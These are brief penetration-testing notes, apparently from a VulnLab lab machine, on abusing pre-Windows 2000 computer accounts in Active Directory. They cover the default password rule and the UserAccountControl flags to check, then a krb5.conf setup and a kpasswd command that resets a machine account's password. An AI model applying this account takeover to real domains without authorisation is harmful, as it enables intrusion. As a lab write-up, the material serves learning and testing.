# Researching Pre-Created Computer Accounts

[Diving into Pre-Created Computer Accounts](https://trustedsec.com/blog/diving-into-pre-created-computer-accounts)

- Pre-Windows 2000 computer account
    - password is the same as the username in lowercase
- UserAccountcontrol flags to look for
    - 32 - PASSWD_NOTREQD
    - 4096 - WORKSTATION_TRUST_ACCOUNT

### Resetting the Password

1. First update this file (changes are **bold** below)
    
    ```jsx
    [libdefaults]
    	**default_realm = RETRO.VL**
    
    # The following krb5.conf variables are only for MIT Kerberos.
    	kdc_timesync = 1
    	ccache_type = 4
    	forwardable = true
    	proxiable = true
            rdns = false
    
    # The following libdefaults parameters are only for Heimdal Kerberos.
    	fcc-mit-ticketflags = true
    
    [realms]
    	**RETRO.VL = {
    		kdc = DC.RETRO.VL
    		admin_server = DC.RETRO.VL
    	}**
    ```
    
2. Ran this command (computer account is case-sensitive)
    
    ```jsx
    ┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/retro.vl]
    └─# kpasswd BANKING$
    Password for BANKING$@RETRO.VL:
    Enter new password:
    Enter it again:
    Password changed.
    ```
    
3. Confirm auth with smbclient
    
